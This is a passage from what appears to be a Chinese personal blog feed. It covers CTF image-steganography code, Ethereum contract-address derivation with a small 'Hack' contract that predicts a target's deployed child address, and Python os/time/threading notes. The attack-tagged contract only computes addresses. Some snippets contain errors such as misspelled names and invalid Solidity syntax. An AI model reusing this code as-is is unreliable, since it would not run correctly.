keyword">for</span> pixel_line <span class="token keyword">in</span> pixels<span class="token punctuation">:</span>    found_red <span class="token operator">=</span> <span class="token boolean">False</span>  <span class="token comment"># 标记是否找到过红色像素</span>    <span class="token comment"># 从第二像素开始遍历，避免初始的索引越界</span>    <span class="token keyword">for</span> idx<span class="token punctuation">,</span> pixel <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>pixel_line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> start<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> found_red <span class="token keyword">and</span> pixel <span class="token operator">!=</span> pixel_line<span class="token punctuation">[</span>idx <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>  <span class="token comment"># 找到红后颜色变化</span>            change_indices<span class="token punctuation">.</span>append<span class="token punctuation">(</span>idx<span class="token punctuation">)</span>  <span class="token comment"># 记录变化位置</span>            <span class="token keyword">break</span>        <span class="token keyword">elif</span> pixel <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 找到红色像素</span>            found_red <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>  <span class="token comment"># 如果一行内没发现变化，记录None</span>        change_indices<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token comment"># 根据找到的索引进行像素行的旋转处理</span>rotated_pixels <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> idx<span class="token punctuation">,</span> pivot <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>change_indices<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> pivot <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>  <span class="token comment"># 如果找到了旋转点</span>        rotated_pixels<span class="token punctuation">.</span>append<span class="token punctuation">(</span>rotate_pixels<span class="token punctuation">(</span>pixels<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> pivot<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>  <span class="token comment"># 没有旋转点，保持原行</span>        rotated_pixels<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pixels<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 创建新图片并放置处理后的像素</span>new_image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>width<span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_image<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> rotated_pixels<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 保存处理后的新图片</span>new_image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'flag1123_processed.png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="lsb隐写"><a class="markdownIt-Anchor" href="#lsb隐写"></a> lsb隐写</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">def</span> <span class="token function">get_secret</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">format</span><span class="token punctuation">(</span>byte<span class="token punctuation">,</span> <span class="token string">'08b'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> byte <span class="token keyword">in</span> data<span class="token punctuation">)</span>     <span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>original_file<span class="token punctuation">,</span> hide_string<span class="token punctuation">,</span> hide_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    im <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>original_file<span class="token punctuation">)</span>    w<span class="token punctuation">,</span> h <span class="token operator">=</span> im<span class="token punctuation">.</span>size    secret_data <span class="token operator">=</span> get_secret<span class="token punctuation">(</span>hide_string<span class="token punctuation">)</span>    index <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> index <span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>secret_data<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>  <span class="token comment"># 已经嵌入所有秘密数据</span>            pixel <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>im<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将元组转为列表以便修改</span>                        <span class="token comment"># 分别在R、G、B通道的最低位嵌入数据</span>            <span class="token keyword">for</span> channel <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> index <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>secret_data<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 确保索引不超出秘密数据长度</span>                    pixel<span class="token punctuation">[</span>channel<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>pixel<span class="token punctuation">[</span>channel<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token builtin">int</span><span class="token punctuation">(</span>secret_data<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 使用位运算修改最低位</span>                    index <span class="token operator">+=</span> <span class="token number">1</span>                        im<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>pixel<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将修改后的像素放回图像</span>    im<span class="token punctuation">.</span>save<span class="token punctuation">(</span>hide_file<span class="token punctuation">)</span>original_file <span class="token operator">=</span> <span class="token string">'1.png'</span>hide_string <span class="token operator">=</span> <span class="token string">'flag.txt'</span>hide_file <span class="token operator">=</span> <span class="token string">'flag.png'</span>encode<span class="token punctuation">(</span>original_file<span class="token punctuation">,</span> hide_string<span class="token punctuation">,</span> hide_file<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="网站"><a class="markdownIt-Anchor" href="#网站"></a> 网站</h3><p><a href="https://incoherency.co.uk/image-steganography/">图像隐写术 (incoherency.co.uk)</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>address计算</title>
      <link href="/2024/04/23/address%E8%AE%A1%E7%AE%97/"/>
      <url>/2024/04/23/address%E8%AE%A1%E7%AE%97/</url>
      
        <content type="html"><![CDATA[<h3 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h3><p>以太坊有两种类型的账户：普通账户和合约账户。合约是通过发送带有空字段的事务(空的 to)来创建的，并且包含一些被执行的数据（一个构造函数），并且希望返回一些放在区块链上的代码。 这些合同自然是与正常账户相同的地址空间的一部分; 由此确定合同的地址：</p><pre class="line-numbers language-none"><code class="language-none">address &#x3D; sha3(rlp_encode(creator_account, creator_account_nonce))[12:]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>合约地址是确定性的，由 keccack256(address,nonce) 计算。(其中 address 是合约的地址(或创建交易的以太坊地址)，而 nonce 是合约生产其它合约的一个数值(或者对于常规交易来说是交易的nonce))。</p><p>从本质上讲，合约的地址就是账户与交易 nonce 串联的 keccak256 哈希值。合约的 nonce 是以 1 开始的，账户的交易 nonce 是以 0 开始的。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">KeylessHiddenEthCreator</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> currentcontractNonce <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// keep track of this contract's nonce publicly (it's also found in the contract's state</span>    <span class="token comment">// determine future addresses which can hide ether.</span>    <span class="token keyword">function</span> <span class="token function">futureAddresses</span><span class="token punctuation">(</span><span class="token builtin">uint8</span> nonce<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nonce <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token number">0xd6</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token number">0xd6</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">,</span> nonce<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// need to implement rlp encoding properly for a full range of nonces</span>        <span class="token comment">// increment the contract nonce or retrieve ether from a hidden/key-less account provided the nonce is correct</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">retrieveHiddenEther</span><span class="token punctuation">(</span><span class="token builtin">address</span> beneficiary<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        currentContractNonce <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">RecoverContract</span><span class="token punctuation">(</span>beneficiary<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment">// Allow ether transfers (helps for playing in remix)</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">RecoverContract</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> beneficiary<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span>beneficiary<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="地址计算脚本"><a class="markdownIt-Anchor" href="#地址计算脚本"></a> 地址计算脚本</h3><h4 id="python"><a class="markdownIt-Anchor" href="#python"></a> python</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> rlp<span class="token keyword">from</span> ethereum <span class="token keyword">import</span> utilsaddress <span class="token operator">=</span> <span class="token number">0xD8d6E16b2a224bB1Cd7e600c0b37603e341b4d93</span>nonce <span class="token operator">=</span> <span class="token number">1</span>rlp_res <span class="token operator">=</span> rlp<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">[</span>address<span class="token punctuation">,</span>nonce<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rlp_res<span class="token punctuation">)</span>sha3_res <span class="token operator">=</span> utils<span class="token punctuation">.</span>mk_contract_address<span class="token punctuation">(</span>address<span class="token punctuation">,</span>nonce<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>sha3_res<span class="token punctuation">)</span>sha3_res_de <span class="token operator">=</span> utils<span class="token punctuation">.</span>decode_addr<span class="token punctuation">(</span>sha3_res<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"contract_address: "</span> <span class="token operator">+</span> sha3_res_de<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="solidity"><a class="markdownIt-Anchor" href="#solidity"></a> solidity</h4><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Hack</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">getdd</span><span class="token punctuation">(</span><span class="token builtin">address</span> target<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">address</span> data <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token builtin">uint160</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span><span class="token builtin">bytes1</span><span class="token punctuation">(</span><span class="token number">0xd6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">bytes1</span><span class="token punctuation">(</span><span class="token number">0x94</span><span class="token punctuation">)</span><span class="token punctuation">,</span> target<span class="token punctuation">,</span> <span class="token builtin">bytes1</span><span class="token punctuation">(</span><span class="token number">0x01</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> data<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 学习</title>
      <link href="/2024/04/15/Python-%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/15/Python-%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="os"><a class="markdownIt-Anchor" href="#os"></a> os</h3><p>os.getcwd()</p><p>查看当前路径。</p><p>os.listdir(path)</p><p>返回指定目录下包含的文件和目录名列表。</p><p>os.path.abspath(path)</p><p>返回路径 path 的绝对路径。</p><p>os.path.split(path)</p><p>将路径 path 拆分为目录和文件两部分，返回结果为元组类型。</p><p>os.path.join(path, *paths)</p><p>将一个或多个 path（文件或目录） 进行拼接。</p><p>os.path.getctime(path)</p><p>返回 path（文件或目录） 在系统中的创建时间。</p><p>os.path.getmtime(path)</p><p>返回 path（文件或目录）的最后修改时间。</p><p>os.makedirs()</p><p>创建多级目录。</p><h3 id="time"><a class="markdownIt-Anchor" href="#time"></a> time</h3><h4 id="struct_time"><a class="markdownIt-Anchor" href="#struct_time"></a> struct_time</h4><p>代表一个时间对象，可以通过索引以及属性名来访问。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">索引属性值<span class="token number">0</span>tm_year（年）如：<span class="token number">1945</span><span class="token number">1</span>tm_mon（月）<span class="token number">1</span> <span class="token operator">~</span> <span class="token number">12</span><span class="token number">2</span>tm_mday（日）<span class="token number">1</span> <span class="token operator">~</span> <span class="token number">31</span><span class="token number">3</span>tm_hour（时）<span class="token number">0</span> <span class="token operator">~</span> <span class="token number">23</span><span class="token number">4</span>tm_min（分）<span class="token number">0</span> <span class="token operator">~</span> <span class="token number">59</span><span class="token number">5</span>tm_sec（秒）<span class="token number">0</span> <span class="token operator">~</span> <span class="token number">61</span><span class="token number">6</span>tm_wday（周）<span class="token number">0</span> <span class="token operator">~</span> <span class="token number">6</span><span class="token number">7</span>tm_yday（一年内第几天）<span class="token number">1</span> <span class="token operator">~</span> <span class="token number">366</span><span class="token number">8</span>tm_isdst（夏时令）<span class="token operator">-</span><span class="token number">1</span>、<span class="token number">0</span>、<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>localtime()表示当前时间，返回类型为 struct_time对象</p><h4 id="常用函数"><a class="markdownIt-Anchor" href="#常用函数"></a> 常用函数</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">函数（常量）说明time<span class="token punctuation">(</span><span class="token punctuation">)</span>返回当前时间的时间戳gmtime<span class="token punctuation">(</span><span class="token punctuation">[</span>secs<span class="token punctuation">]</span><span class="token punctuation">)</span>将时间戳转换为格林威治天文时间下的 struct_time，可选参数 secs 表示从 epoch 到现在的秒数，默认为当前时间localtime<span class="token punctuation">(</span><span class="token punctuation">[</span>secs<span class="token punctuation">]</span><span class="token punctuation">)</span>与 gmtime<span class="token punctuation">(</span><span class="token punctuation">)</span> 相似，返回当地时间下的 struct_timemktime<span class="token punctuation">(</span>t<span class="token punctuation">)</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span> 的反函数asctime<span class="token punctuation">(</span><span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span>接收一个 struct_time 表示的时间，返回形式为：Mon Dec  <span class="token number">2</span> <span class="token number">08</span><span class="token punctuation">:</span><span class="token number">53</span><span class="token punctuation">:</span><span class="token number">47</span> <span class="token number">2019</span> 的字符串ctime<span class="token punctuation">(</span><span class="token punctuation">[</span>secs<span class="token punctuation">]</span><span class="token punctuation">)</span>ctime<span class="token punctuation">(</span>secs<span class="token punctuation">)</span> 相当于 asctime<span class="token punctuation">(</span>localtime<span class="token punctuation">(</span>secs<span class="token punctuation">)</span><span class="token punctuation">)</span>strftime<span class="token punctuation">(</span><span class="token builtin">format</span><span class="token punctuation">[</span><span class="token punctuation">,</span> t<span class="token punctuation">]</span><span class="token punctuation">)</span>格式化日期，接收一个 struct_time 表示的时间，并返回以可读字符串表示的当地时间sleep<span class="token punctuation">(</span>secs<span class="token punctuation">)</span>暂停执行调用线程指定的秒数altzone本地 DST 时区的偏移量，以 UTC 为单位的秒数timezone本地（非 DST）时区的偏移量，UTC 以西的秒数（西欧大部分地区为负，美国为正，英国为零）tzname两个字符串的元组：第一个是本地非 DST 时区的名称，第二个是本地 DST 时区的名称<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="多线程"><a class="markdownIt-Anchor" href="#多线程"></a> 多线程</h3><p>线程是CPU分配资源的基本单位。当一程序开始运行，这个程序就变成了一个进程，而一个进程相当于一个或者多个线程。当没有多线程编程时，一个进程相当于一个主线程；当有多线程编程时，一个进程包含多个线程（含主线程）。使用线程可以实现程序大的开发。</p><h5 id="创建多线程"><a class="markdownIt-Anchor" href="#创建多线程"></a> 创建多线程</h5><ol><li>threading.Thread()创建</li></ol><p>语法形式：</p><p>threading.Thread(group=nore,target=none,args=(),kwargs={},*,daemon=None)</p><p>~group：必须为None，于ThreadGroup类相关，一般不使用。</p><p>~target：线程调用的对象，就是目标函数。</p><p>~name：为线程起这个名字。默认是Tread-x，x是序号，由1开始，第一个创建的线程名字就是Tread-1。</p><p>~args：为目标函数传递关键字参数，字典。</p><p>~daemon：用来设置线程是否随主线程退出而退出。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>t1 <span class="token operator">=</span> threadingTthread<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'t1'</span><span class="token punctuation">,</span>target<span class="token operator">=</span> test<span class="token punctuation">,</span>args<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>t2 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'t2'</span><span class="token punctuation">,</span>target<span class="token operator">=</span> test<span class="token punctuation">,</span>args<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>两个程序是并发运行，所以顺序可能不</p><ol start="2"><li><p>treading.Thread类的继承</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">class</span> <span class="token class-name">mythread</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>t1<span class="token operator">=</span>mythread<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>t2<span class="token operator">=</span>mythread<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="主线程"><a class="markdownIt-Anchor" href="#主线程"></a> 主线程</h4><p>第一个启动的线程就是主线程</p><p>父线程： 启动A线程中启动了线程B，A就是B的父线程</p><p>子线程：B就是A的子线程。</p><p>创建线程时有一个damon属性，用它来判断主线程。当daemon设置False时，线程不会随主线程退出而退出，主线程会一直等着子线程执行完;。当daemon设置True时，线程会随主线程退出而退出，主线程结束其他的子线程会强制退出。</p><h4 id="阻塞线程"><a class="markdownIt-Anchor" href="#阻塞线程"></a> 阻塞线程</h4><p>在一个线程中调用另一个线程的join方法，调用者被阻塞，知道调用线程被终止。</p><p>语法形式：</p><pre class="line-numbers language-none"><code class="language-none">join(timeout -&#x3D; None)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不设置时，就一直等待被调用线程结束。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time<span class="token keyword">import</span> threading<span class="token keyword">class</span> <span class="token class-name">mythread</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>t1<span class="token operator">=</span>mythread<span class="token punctuation">(</span><span class="token punctuation">)</span>t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>t1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">hello将会在输出玩0-9后再输出<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="判断主线程是否活动"><a class="markdownIt-Anchor" href="#判断主线程是否活动"></a> 判断主线程是否活动</h4><p>run() ：表示线程活动的方法</p><p>start() ：启动线程</p><p>join() ：等待线程终止</p><p>isAlive() ：返回线程是否活动</p><p>getAame() ：返回线程名称</p><p>setName() ：设置线程名称</p><h4 id="线程同步"><a class="markdownIt-Anchor" href="#线程同步"></a> 线程同步</h4><h5 id="python的锁就解决这一问题锁住线程只允许一个线程操作其他线程排队等待待当前线程操作完毕后再按顺序一个一个来运行"><a class="markdownIt-Anchor" href="#python的锁就解决这一问题锁住线程只允许一个线程操作其他线程排队等待待当前线程操作完毕后再按顺序一个一个来运行"></a> python的锁就解决这一问题，锁住线程，只允许一个线程操作，其他线程排队等待，待当前线程操作完毕后，再按顺序一个一个来运行。</h5><h5 id="python中的锁"><a class="markdownIt-Anchor" href="#python中的锁"></a> python中的锁：</h5><p>python的threading模块提供了RLock锁解决方法。在某一时间只能让一个线程操作的语句放到RLock的acquire方法和release方法之间，即acquire相当于给RLack上锁，而release相当于解锁</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">class</span> <span class="token class-name">mythread</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">global</span> x                   <span class="token comment">#声明一个全局变量</span>  lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>             <span class="token comment">#上锁</span>  x <span class="token operator">+=</span><span class="token number">10</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s:%d'</span><span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>  lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token 